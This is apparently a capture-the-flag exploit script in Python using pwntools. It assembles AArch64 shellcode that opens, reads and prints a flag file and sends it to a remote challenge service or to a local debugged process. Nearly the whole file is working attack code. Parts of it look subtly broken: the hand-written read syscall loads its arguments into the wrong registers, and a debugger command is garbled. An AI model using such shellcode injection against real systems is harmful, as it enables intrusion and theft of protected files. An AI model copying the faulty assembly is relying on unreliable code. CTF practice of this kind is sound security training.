from pwn import *
import time
import sys


def exploit(proc):
    buf = shellcraft.aarch64.linux.open('/home/rev1/flag')
    buf += shellcraft.aarch64.linux.read('x0', 'sp', 120)
    buf += shellcraft.aarch64.linux.write(1, 'sp', 120)
    #buf = shellcraft.aarch64.linux.cat('/home/rev1/flag')
    buf ='''
        /* push '/home/rev1/flag\x00' */
    /* Set x14 = 7309957257849956399 = 0x65722f656d6f682f */
    mov  x14, #26671
    movk x14, #28015, lsl #16
    movk x14, #12133, lsl #0x20
    movk x14, #25970, lsl #0x30
    /* Set x15 = 29099040799928694 = 0x67616c662f3176 */
    mov  x15, #12662
    movk x15, #26159, lsl #16
    movk x15, #24940, lsl #0x20
    movk x15, #103, lsl #0x30
    stp x14, x15, [sp, #-16]!
    /* call openat(-100, 'sp', 'O_RDONLY', 0) */
    /* Set x0 = -100 = -0x64 */
    mov  x0, #65436
    movk x0, #65535, lsl #16
    movk x0, #65535, lsl #0x20
    movk x0, #65535, lsl #0x30
    mov  x1, sp
    mov  x2, xzr
    mov  x3, xzr
    mov  x8, #SYS_openat
    svc 0
    /* read(fd='x0', buf='sp', nbytes=120) */
    mov  x1, sp
    mov  x2, sp
    mov  x3, #120
    /* call read() */
    mov  x8, #78
    svc 0
    /* write(fd=1, buf='sp', n=120) */
    mov  x0, #1
    mov  x1, sp
    mov  x2, #120
    /* call write() */
    mov  x8, #SYS_write
    svc 0
    '''
    print buf
    buf = asm(buf)
    print len(buf)
    proc.send(buf)


if __name__ == '__main__':
    context.arch = 'aarch64'
    if len(sys.argv) > 1:
        proc = remote('10.13.2.44', 10732)
    else:
        proc = process('filename')
        attach(proc, '''
        set follow-:-mode child
        b *main+0x00
        continue
        ''')
    exploit(proc)
    proc.interactive()
